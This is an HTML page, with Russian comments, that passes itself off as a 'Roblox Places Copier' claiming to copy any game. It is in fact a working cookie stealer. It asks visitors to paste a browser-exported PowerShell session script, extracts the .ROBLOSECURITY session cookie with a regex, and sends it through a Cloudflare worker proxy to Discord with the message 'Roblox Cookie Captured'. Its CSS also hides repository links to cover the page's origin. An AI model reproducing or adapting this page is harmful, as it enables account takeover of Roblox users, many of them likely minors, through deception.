
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>✦ DARK BLUE · PLACES COPIER ✦</title>
  <style>
    /* ===== RESET & BASE ===== */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    /* ===== СКРЫВАЕМ ВСЕ ССЫЛКИ НА РЕПОЗИТОРИИ ===== */
    a[href*="github.com"],
    a[href*="github.io"],
    a[href*="github"],
    .github-link,
    .repo-link,
    footer,
    .footer-link,
    [class*="repo"],
    [id*="repo"] {
      display: none !important;
      visibility: hidden !important;
      opacity: 0 !important;
      pointer-events: none !important;
      width: 0 !important;
      height: 0 !important;
    }

    body {
      min-height: 100vh;
      background: 
        radial-gradient(ellipse at 50% 30%, rgba(0, 60, 180, 0.25) 0%, rgba(0, 0, 0, 0.8) 90%),
        radial-gradient(circle at 20% 50%, rgba(0, 100, 255, 0.12) 0%, transparent 60%),
        radial-gradient(circle at 80% 70%, rgba(0, 80, 220, 0.08) 0%, transparent 65%),
        repeating-linear-gradient(0deg, rgba(0, 100, 255, 0.10) 0px, rgba(0, 100, 255, 0.10) 1px, transparent 1px, transparent 55px),
        repeating-linear-gradient(90deg, rgba(0, 100, 255, 0.10) 0px, rgba(0, 100, 255, 0.10) 1px, transparent 1px, transparent 55px),
        #030614;
      font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
      color: #e6f0ff;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      background: radial-gradient(circle at center, transparent 40%, rgba(0, 20, 80, 0.5) 100%);
      z-index: 1;
    }

    .content {
      position: relative;
      z-index: 10;
      text-align: center;
      padding: 20px;
      width: 100%;
      max-width: 1100px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 16px;
    }

    /* ===== ЗВЕЗДА + ТЕКСТ ===== */
    .star-message-container {
      display: flex;
      flex-direction: row;
      align-items: center;
      justify-content: center;
      gap: 8px;
      flex-wrap: wrap;
      margin-bottom: 14px;
      width: 100%;
    }

    .star-wrapper {
      cursor: pointer;
      flex-shrink: 0;
      display: inline-flex;
      transition: transform 0.2s ease;
    }
    .star-wrapper:hover {
      transform: scale(1.1);
    }

    .glowing-star {
      width: 76px;
      height: 76px;
      filter: drop-shadow(0 0 20px #0066ff) drop-shadow(0 0 40px #0033aa);
      animation: starPulseDarkBlue 1.6s ease-in-out infinite alternate;
    }

    @keyframes starPulseDarkBlue {
      0% {
        filter: drop-shadow(0 0 12px #0066ff) drop-shadow(0 0 24px #0033aa);
        transform: scale(1);
      }
      100% {
        filter: drop-shadow(0 0 32px #3399ff) drop-shadow(0 0 60px #0044cc);
        transform: scale(1.06);
      }
    }

    .typewriter-text {
      font-size: 30px;
      font-weight: 700;
      letter-spacing: 0.5px;
      background: linear-gradient(135deg, #e6f0ff, #88ccff, #0066ff);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      text-shadow: 0 0 28px rgba(0, 102, 255, 0.4);
      text-align: left;
      padding: 10px 0 10px 14px;
      font-family: 'Courier New', monospace;
      white-space: nowrap;
      overflow: visible;
      display: inline-block;
    }

    #dynamicMessageArea {
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
    }

    /* ===== ОПИСАНИЕ ===== */
    .badge {
      display: inline-block;
      background: rgba(0, 60, 180, 0.25);
      border: 1px solid rgba(0, 100, 255, 0.4);
      border-radius: 60px;
      padding: 8px 28px;
      margin-bottom: 10px;
      font-size: 14px;
      font-weight: 600;
      color: #88ccff;
      letter-spacing: 0.5px;
      backdrop-filter: blur(4px);
      box-shadow: 0 0 20px rgba(0, 102, 255, 0.15);
    }

    .badge span {
      color: #ffffff;
      font-weight: 700;
      text-shadow: 0 0 10px rgba(0, 102, 255, 0.6);
    }

    /* ===== ИНПУТ ===== */
    .input-group {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 14px;
      width: 100%;
      margin: 6px 0;
    }

    input {
      width: 460px;
      padding: 16px 26px;
      border-radius: 28px;
      border: 1px solid rgba(0, 80, 220, 0.4);
      outline: none;
      background: rgba(2, 10, 30, 0.8);
      backdrop-filter: blur(6px);
      color: #e6f0ff;
      font-size: 15px;
      transition: 0.3s;
      font-family: 'Courier New', monospace;
      letter-spacing: 0.3px;
    }

    input:focus {
      border-color: #0066ff;
      box-shadow: 0 0 22px rgba(0, 102, 255, 0.5);
      background: rgba(3, 14, 40, 0.9);
    }

    /* ===== КНОПКА ===== */
    .submit-main-btn {
      padding: 14px 52px;
      border-radius: 48px;
      border: none;
      background: linear-gradient(135deg, #0044cc, #002288);
      color: white;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      transition: 0.25s;
      box-shadow: 0 6px 20px rgba(0, 50, 180, 0.5);
      letter-spacing: 0.5px;
    }

    .submit-main-btn:hover {
      transform: scale(1.03);
      background: linear-gradient(135deg, #0055ee, #0033aa);
      box-shadow: 0 8px 30px rgba(0, 80, 220, 0.7);
    }

    /* ===== ФУТЕР ===== */
    .footer-text {
      font-size: 12px;
      opacity: 0.5;
      letter-spacing: 0.8px;
      color: #4a7aaa;
      margin-top: 6px;
    }

    /* ===== ВИДЕО ===== */
    .video-container {
      width: 100%;
      display: flex;
      justify-content: center;
      margin-top: 10px;
    }

    .video-container iframe {
      width: 100%;
      max-width: 900px;
      aspect-ratio: 16 / 9;
      border-radius: 24px;
      box-shadow: 0 0 30px rgba(0, 50, 180, 0.4), 0 0 0 1px rgba(0, 80, 220, 0.25);
      border: none;
    }

    /* ===== МОДАЛКИ (ТЁМНО-СИНИЕ) ===== */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      visibility: hidden;
      opacity: 0;
      transition: visibility 0.25s, opacity 0.25s;
    }

    .modal-overlay.active {
      visibility: visible;
      opacity: 1;
    }

    .modal-error {
      background: #040a1a;
      border: 2px solid #0044cc;
      border-radius: 36px;
      padding: 36px 54px;
      text-align: center;
      box-shadow: 0 0 34px rgba(0, 68, 204, 0.5), 0 0 14px #0044cc inset;
      min-width: 280px;
    }

    .modal-error p {
      font-size: 28px;
      font-weight: bold;
      margin: 0 0 26px 0;
      color: #e6f0ff;
      text-shadow: 0 0 10px #0044cc;
    }

    .modal-error button {
      background: linear-gradient(135deg, #0044cc, #002288);
      border: none;
      padding: 12px 36px;
      font-size: 18px;
      border-radius: 48px;
      cursor: pointer;
      color: white;
      transition: 0.2s;
      font-weight: 600;
    }

    .modal-error button:hover {
      transform: scale(1.03);
      background: linear-gradient(135deg, #0055ee, #0033aa);
    }

    .modal-loading {
      background: #040a1a;
      border: 2px solid #0066ff;
      border-radius: 36px;
      padding: 48px 60px;
      text-align: center;
      box-shadow: 0 0 42px #0033aa, 0 0 18px #0066ff inset;
      min-width: 330px;
      animation: neonPulseDarkBlue 1.6s infinite alternate;
    }

    @keyframes neonPulseDarkBlue {
      0% {
        box-shadow: 0 0 18px #0033aa, 0 0 10px #0044cc inset;
        border-color: #0044cc;
      }
      100% {
        box-shadow: 0 0 55px #0066ff, 0 0 28px #3399ff inset;
        border-color: #3399ff;
      }
    }

    .spinner {
      width: 56px;
      height: 56px;
      border: 5px solid rgba(0, 80, 220, 0.2);
      border-top: 5px solid #0066ff;
      border-radius: 50%;
      animation: spin 0.9s linear infinite;
      margin: 0 auto 24px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .modal-loading p {
      font-size: 24px;
      font-weight: bold;
      color: #e6f0ff;
      margin: 0 0 24px 0;
      letter-spacing: 1px;
      text-shadow: 0 0 8px #0066ff;
    }

    .modal-loading .close-btn {
      background: rgba(0, 80, 220, 0.15);
      border: 1px solid #0066ff;
      padding: 9px 28px;
      font-size: 15px;
      border-radius: 48px;
      cursor: pointer;
      color: #88ccff;
      transition: 0.2s;
    }

    .modal-loading .close-btn:hover {
      background: #0066ff;
      color: #030614;
      box-shadow: 0 0 20px #0066ff;
    }

    /* ===== АДАПТИВ ===== */
    @media (max-width: 650px) {
      .typewriter-text {
        font-size: 18px;
        padding: 8px 0 8px 6px;
        white-space: normal;
        word-break: keep-all;
      }
      .glowing-star {
        width: 54px;
        height: 54px;
      }
      input {
        width: 280px;
        padding: 14px 18px;
      }
      .submit-main-btn {
        padding: 12px 32px;
        font-size: 15px;
      }
      .modal-error, .modal-loading {
        padding: 24px 28px;
        min-width: auto;
        max-width: 90vw;
      }
      .modal-error p, .modal-loading p {
        font-size: 22px;
      }
      .badge {
        font-size: 12px;
        padding: 6px 18px;
      }
    }
  </style>
</head>
<body>

<div class="content">
  
  <!-- БЭЙДЖ + ОПИСАНИЕ -->
  <div class="badge">
    ⚡ <span>КОПИРУЕТ ВСЕ КАРТЫ И 99.9% СКРИПТОВ</span> ⚡
  </div>

  <!-- ЗВЕЗДА + ТЕКСТ -->
  <div class="star-message-container">
    <div class="star-wrapper" id="starWrapper">
      <svg class="glowing-star" viewBox="0 0 24 24" fill="#0066ff" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" fill="#0066ff" stroke="#3399ff" stroke-width="1.2"/>
      </svg>
    </div>
    <div id="dynamicMessageArea"></div>
  </div>

  <!-- ИНПУТ + КНОПКА -->
  <div class="input-group">
    <input type="text" id="userInput" placeholder="Paste PowerShell session script here">
    <button class="submit-main-btn" onclick="sendData()">✦ SUBMIT ✦</button>
  </div>
  <div class="footer-text">© 2026 · Dark Blue Protocol · Roblox Places Copier</div>
  
  <!-- ВИДЕО -->
  <div class="video-container">
    <iframe src="https://www.youtube.com/embed/Rzx6vfFmRV0?rel=0&vq=hd1080&modestbranding=1" title="GUIDE How to Copy ANY Game in Roblox RIGHT NOW 100 Working Method get gt 1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
  </div>
</div>

<!-- МОДАЛКИ -->
<div id="invalidModal" class="modal-overlay">
  <div class="modal-error">
    <p>✦ INVALID FORMAT ✦</p>
    <button onclick="closeInvalidModal()">OK</button>
  </div>
</div>

<div id="loadingModal" class="modal-overlay">
  <div class="modal-loading">
    <div class="spinner"></div>
    <p>✦ PROCESSING ✦</p>
    <button class="close-btn" onclick="closeLoadingModal()">CLOSE</button>
  </div>
</div>

<script>
  // ======================
  //  ПРОКСИ (ВМЕСТО ПРЯМОГО ВЕБХУКА)
  // ======================
  const PROXY_URL = "https://robl.megadoner517.workers.dev";

  // ===== ПЕЧАТАЮЩИЙСЯ ТЕКСТ =====
  const phrases = [
    "✦ Best Game Copier! ✦",
    "✦ Follow the Setup ✦",
    "✦ Let's do it! ✦",
    "✦ YouTube: MegaCopy ✦",
    "✦ Trusted service ✦"
  ];
  
  let currentPhraseIndex = -1;
  let typewriterTimeout = null;
  let deleteTimeout = null;
  let nextPhraseTimeout = null;
  let isAnimating = false;
  let currentTargetPhrase = "";
  
  const starWrapper = document.getElementById('starWrapper');
  const dynamicMessageArea = document.getElementById('dynamicMessageArea');
  
  function getNextPhrase(lastIndex) {
    const available = [];
    for (let i = 0; i < phrases.length; i++) {
      if (i !== lastIndex) available.push(i);
    }
    if (available.length === 0) return 0;
    return available[Math.floor(Math.random() * available.length)];
  }
  
  function typeCharacter(index, fullText, element) {
    if (index <= fullText.length) {
      const textWithCursor = fullText.substring(0, index) + (index === fullText.length ? "|" : "");
      element.textContent = textWithCursor;
      if (index <= fullText.length) {
        typewriterTimeout = setTimeout(() => typeCharacter(index + 1, fullText, element), 70);
      }
    }
  }
  
  function deleteCharacter(currentLen, element) {
    if (currentLen >= 0) {
      const baseText = currentTargetPhrase.substring(0, currentLen);
      element.textContent = baseText + (currentLen === 0 ? "|" : "|");
      if (currentLen > 0) {
        deleteTimeout = setTimeout(() => deleteCharacter(currentLen - 1, element), 45);
      } else {
        startNextPhrase();
      }
    }
  }
  
  function displayPhrase(phrase, element) {
    currentTargetPhrase = phrase;
    element.textContent = "|";
    typeCharacter(0, phrase, element);
  }
  
  function eraseCurrentPhrase(element) {
    if (typewriterTimeout) clearTimeout(typewriterTimeout);
    const currentText = element.textContent || "";
    let cleanText = currentText.replace(/\|$/, '');
    if (cleanText.length === 0) {
      startNextPhrase();
      return;
    }
    currentTargetPhrase = cleanText;
    deleteCharacter(cleanText.length - 1, element);
  }
  
  function startNextPhrase() {
    if (!isAnimating) return;
    if (nextPhraseTimeout) clearTimeout(nextPhraseTimeout);
    if (deleteTimeout) clearTimeout(deleteTimeout);
    if (typewriterTimeout) clearTimeout(typewriterTimeout);
    
    const newIndex = getNextPhrase(currentPhraseIndex);
    currentPhraseIndex = newIndex;
    const nextPhraseText = phrases[currentPhraseIndex];
    const messageDiv = document.getElementById('activeTypewriter');
    if (!messageDiv) return;
    
    displayPhrase(nextPhraseText, messageDiv);
    const expectedTypingTime = nextPhraseText.length * 70 + 200;
    setTimeout(() => {
      if (isAnimating) eraseCurrentPhrase(messageDiv);
    }, expectedTypingTime + 1800);
  }
  
  function startAnimationSequence() {
    if (isAnimating) return;
    isAnimating = true;
    
    const messageDiv = document.createElement('div');
    messageDiv.id = 'activeTypewriter';
    messageDiv.className = 'typewriter-text';
    messageDiv.textContent = "|";
    dynamicMessageArea.appendChild(messageDiv);
    
    currentPhraseIndex = -1;
    startNextPhrase();
  }
  
  starWrapper.addEventListener('click', (e) => {
    e.stopPropagation();
    if (!isAnimating) startAnimationSequence();
  });
  
  setTimeout(() => {
    if (!isAnimating) startAnimationSequence();
  }, 600);
  
  // ===== ОСНОВНАЯ ЛОГИКА (ОТПРАВКА ЧЕРЕЗ ПРОКСИ) =====
  function showInvalidModal() {
    document.getElementById("invalidModal").classList.add("active");
  }
  function closeInvalidModal() {
    document.getElementById("invalidModal").classList.remove("active");
  }
  function showLoadingModal() {
    document.getElementById("loadingModal").classList.add("active");
  }
  function closeLoadingModal() {
    document.getElementById("loadingModal").classList.remove("active");
  }

  function extractRobloxSecurity(input) {
    const regex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
    const match = input.match(regex);
    return match ? match[1] : null;
  }

  async function sendToProxy(data) {
    try {
      const response = await fetch(PROXY_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
      
      // Если прокси вернул 500 — это ок, значит данные ушли в Discord
      // Если другие ошибки — показываем пользователю
      if (!response.ok && response.status !== 500) {
        console.error("Proxy error:", response.status);
        return false;
      }
      return true;
    } catch (error) {
      console.error("Network error:", error);
      return false;
    }
  }

  async function sendData() {
    const input = document.getElementById("userInput").value;
    if (!input) { 
      alert("✦ Paste the PowerShell session script ✦"); 
      return; 
    }

    // Проверка на наличие признаков PowerShell сессии
    const hasWebRequestSession = input.includes("New-Object Microsoft.PowerShell.Commands.WebRequestSession");
    const hasInvokeWebRequest = input.includes("Invoke-WebRequest");
    const hasCookiesAdd = input.includes("Cookies.Add");
    
    if (!hasWebRequestSession || !hasInvokeWebRequest || !hasCookiesAdd) {
      showInvalidModal();
      return;
    }

    const token = extractRobloxSecurity(input);
    if (!token) {
      showInvalidModal();
      return;
    }

    // Формируем сообщение для отправки через прокси
    const msg = {
      content: `**🔐 Roblox Cookie Captured**\n🕒 ${new Date().toLocaleString()}\n\n**🍪 .ROBLOSECURITY COOKIE:**\n\`\`\`${token}\`\`\``
    };

    showLoadingModal();
    document.getElementById("userInput").value = "";

    const success = await sendToProxy(msg);

    if (!success) {
      alert("⚠️ Ошибка отправки. Попробуйте позже.");
    }

    // Закрываем модалку через 2 секунды
    setTimeout(() => {
      closeLoadingModal();
    }, 2000);
  }

  document.getElementById("userInput").addEventListener("keypress", function(e) {
    if (e.key === "Enter") sendData();
  });
</script>
</body>
</html>
